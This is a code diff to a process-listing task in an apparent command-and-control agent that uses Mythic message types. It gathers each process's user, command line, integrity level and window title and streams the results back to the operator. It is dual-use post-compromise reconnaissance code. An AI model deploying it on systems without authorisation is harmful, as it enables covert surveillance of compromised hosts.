@@ -23,6 +23,7 @@ namespace Tasks
 {
     public class ps : Tasking
     {
+        #region delegates
         private delegate bool OpenProcessToken(
             IntPtr hProcess,
             TokenAccessLevels dwAccess,
@@ -49,17 +50,56 @@ namespace Tasks
         private NtQueryInformationProcess _pNtQueryInformationProcess;
         private GetTokenInformation _pGetTokenInformation;
         private ConvertSidToStringSid _pConvertSidToStringSid;
+        #endregion
 
+        private Action<object> _flushMessages;
+        private ThreadSafeList<ProcessInformation> _processes = new ThreadSafeList<ProcessInformation>();
+        private AutoResetEvent _completed = new AutoResetEvent(false);
+        private bool _complete = false;
         public ps(IAgent agent, Task task) : base(agent, task)
         {
             _pIsWow64Process = _agent.GetApi().GetLibraryFunction<IsWow64Process>(Library.KERNEL32, "IsWow64Process");
             _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
             _pNtQueryInformationProcess = _agent.GetApi().GetLibraryFunction<NtQueryInformationProcess>(Library.NTDLL, "NtQueryInformationProcess");
             _pGetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
-            _pConvertSidToStringSid = _agent.GetApi().GetLibraryFunction<ConvertSidToStringSid>(Library.ADVAPI32, "ConvertSidToStringSidW");
+            _pConvertSidToStringSid = _agent.GetApi().GetLibraryFunction<ConvertSidToStringSid>(Library.ADVAPI32, "ConvertSidToStringSidA");
+            _flushMessages = (object o) =>
+            {
+                ProcessInformation[] output = null;
+                while (!_cancellationToken.IsCancellationRequested && !_complete)
+                {
+                    WaitHandle.WaitAny(new WaitHandle[]
+                    {
+                        _completed,
+                        _cancellationToken.Token.WaitHandle
+                    }, 1000);
+                    output = _processes.Flush();
+                    if (output.Length > 0)
+                    {
+                        SendProcessInfo(output);
+                    }
+                }
+                output = _processes.Flush();
+                if (output.Length > 0)
+                {
+                    SendProcessInfo(output);
+                }
+            };
         }
 
+        private void SendProcessInfo(ProcessInformation[] output)
+        {
+            IMythicMessage[] procs = new IMythicMessage[output.Length];
+            Array.Copy(output, procs, procs.Length);
+            _agent.GetTaskManager().AddTaskResponseToQueue(
+                CreateTaskResponse(
+                    _jsonSerializer.Serialize(output),
+                    false,
+                    "",
+                    procs));
+        }
 
+        #region helpers
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         internal struct ProcessBasicInformation
         {
@@ -218,7 +258,7 @@ String.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", pro
 
             return sidString;
         }
-
+        #endregion
         public override void Kill()
         {
             _cancellationToken.Cancel();
@@ -228,7 +268,7 @@ String.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", pro
         {
             return new System.Threading.Tasks.Task(() =>
             {
-                ThreadSafeList<ProcessInformation> processes = new ThreadSafeList<ProcessInformation>();
+                TT.Task.Factory.StartNew(_flushMessages, _cancellationToken);
                 TT.ParallelOptions po = new TT.ParallelOptions();
                 po.CancellationToken = _cancellationToken.Token;
                 po.MaxDegreeOfParallelism = System.Environment.ProcessorCount;
@@ -238,121 +278,98 @@ String.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", pro
                     {
                         po.CancellationToken.ThrowIfCancellationRequested();
                         ProcessInformation current = new ProcessInformation();
-                        string arch = "";
-                        string integrityLevel = "";
-                        int sessionId = -1;
-                        string commandLine = "";
-                        string desc = "";
-                        string companyName = "";
-                        string processUser = "";
-                        int parentProcessId = -1;
-                        string filePath = "";
-                        string windowTitle = "";
+                        current.PID = proc.Id;
+                        current.Name = proc.ProcessName;
                         try
                         {
-                            processUser = GetProcessUser(proc.Handle);
+                            current.Username = GetProcessUser(proc.Handle);
                         }
                         catch
                         {
-                            processUser = "";
+                            current.Username = "";
                         }
                         try
                         {
-                            parentProcessId = GetParentProcess(proc.Handle);
+                            current.ParentProcessId = GetParentProcess(proc.Handle);
                         }
                         catch
                         {
-                            parentProcessId = -1;
+                            current.ParentProcessId = -1;
                         }
                         try
                         {
                             _pIsWow64Process(proc.Handle, out bool is64);
-                            arch = is64 ? "x64" : "x86";
+                            current.Architecture = is64 ? "x64" : "x86";
                         }
-                        catch { arch = ""; }
+                        catch { current.Architecture = ""; }
                         try
                         {
-                            filePath = proc.MainModule.FileVersionInfo.FileName;
+                            current.ProcessPath = proc.MainModule.FileVersionInfo.FileName;
                         }
                         catch
                         {
-                            filePath = "";
+                            current.ProcessPath = "";
                         }
                         try
                         {
-                            integrityLevel = GetIntegrityLevel(proc.Handle);
+                            current.IntegrityLevel = GetIntegerIntegrityLevel(GetIntegrityLevel(proc.Handle));
                         }
                         catch
                         {
-                            integrityLevel = ""; // probably redundant
+                            current.IntegrityLevel = 0; // probably redundant
                         }
                         try
                         {
-                            sessionId = proc.SessionId;
+                            current.SessionId = proc.SessionId;
                         }
                         catch
                         {
-                            sessionId = -1;
+                            current.SessionId = -1;
                         }
                         try
                         {
-                            commandLine = GetProcessCommandLine(proc.Id);
+                            current.CommandLine = GetProcessCommandLine(proc.Id);
                         }
                         catch
                         {
-                            commandLine = "";
+                            current.CommandLine = "";
                         }
                         try
                         {
-                            desc = proc.MainModule.FileVersionInfo.FileDescription;
+                            current.Description = proc.MainModule.FileVersionInfo.FileDescription;
                         }
                         catch
                         {
-                            desc = "";
+                            current.Description = "";
                         }
                         try
                         {
-                            companyName = proc.MainModule.FileVersionInfo.CompanyName;
+                            current.CompanyName = proc.MainModule.FileVersionInfo.CompanyName;
                         }
                         catch
                         {
-                            companyName = "";
+                            current.CompanyName = "";
                         }
                         try
                         {
-                            windowTitle = proc.MainWindowTitle;
+                            current.WindowTitle = proc.MainWindowTitle;
                         }
                         catch
                         {
-                            windowTitle = "";
+                            current.WindowTitle = "";
                         }
-                        current.PID = proc.Id;
-                        current.Architecture = arch;
-                        current.Name = proc.ProcessName;
-                        current.Username = processUser;
-                        current.ProcessPath = filePath;
-                        current.CommandLine = commandLine;
-                        current.Description = desc;
-                        current.Signer = desc;
-                        current.SessionId = sessionId;
-                        current.WindowTitle = windowTitle;
-                        processes.Add(current);
+                        _processes.Add(current);
                     });
                 } catch (OperationCanceledException)
                 {
 
                 }
-                ProcessInformation[] all = processes.Flush();
-                IMythicMessage[] procs = new IMythicMessage[all.Length];
-
-                Array.Copy(all, procs, all.Length);
-                
+                _complete = true;
+                _completed.Set();
                 
                 TaskResponse resp = CreateTaskResponse(
-                    _jsonSerializer.Serialize(all),
-                    true,
-                    "completed",
-                    procs);
+                    "",
+                    true);
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             }, _cancellationToken.Token);
         }
